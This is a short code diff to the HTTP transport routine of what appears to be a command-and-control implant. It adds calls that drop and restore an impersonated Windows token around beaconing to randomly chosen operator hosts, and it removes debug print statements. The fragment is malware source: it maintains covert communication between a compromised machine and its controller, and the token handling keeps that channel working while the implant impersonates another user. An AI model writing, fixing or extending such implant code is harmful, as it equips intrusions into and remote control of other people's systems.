@@ -161,7 +161,6 @@ BOOL TransportInit( PPACKAGE Package )
     PackageAddInt32( Package, Instance->Config.Sleeping );
 
     // End of Options
-
     if ( Initialize )
     {
 #ifdef TRANSPORT_HTTP
@@ -221,6 +220,9 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     SIZE_T  RespSize        = 0;
     BOOL    Successful      = TRUE;
 
+    /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
+    TokenImpersonate( FALSE );
+
     if ( Instance->Config.Transport.Proxy.Enabled )
     {
         HttpAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
@@ -259,7 +261,6 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         HttpHost = Instance->Config.Transport.Hosts[ RandomNumber32() % Counter ];
     }
 
-    PRINTF( "WinHttpConnect( %x, %ls, %d, 0 )\n", hSession, HttpHost, Instance->Config.Transport.Port )
     hConnect = Instance->Win32.WinHttpConnect( hSession, HttpHost, Instance->Config.Transport.Port, 0 );
     if ( ! hConnect )
     {
@@ -281,7 +282,6 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     if ( Instance->Config.Transport.Secure )
         HttpFlags |= WINHTTP_FLAG_SECURE;
 
-    PRINTF( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %d )\n", hConnect, Instance->Config.Transport.Method, HttpEndpoint, HttpFlags )
     hRequest = Instance->Win32.WinHttpOpenRequest( hConnect, Instance->Config.Transport.Method, HttpEndpoint, NULL, NULL, NULL, HttpFlags );
     if ( ! hRequest )
     {
@@ -395,6 +395,9 @@ LEAVE:
     Instance->Win32.WinHttpCloseHandle( hSession );
     Instance->Win32.WinHttpCloseHandle( hConnect );
     Instance->Win32.WinHttpCloseHandle( hRequest );
+
+    /* re-impersonate the token */
+    TokenImpersonate( TRUE );
 
     return Successful;
 #endif
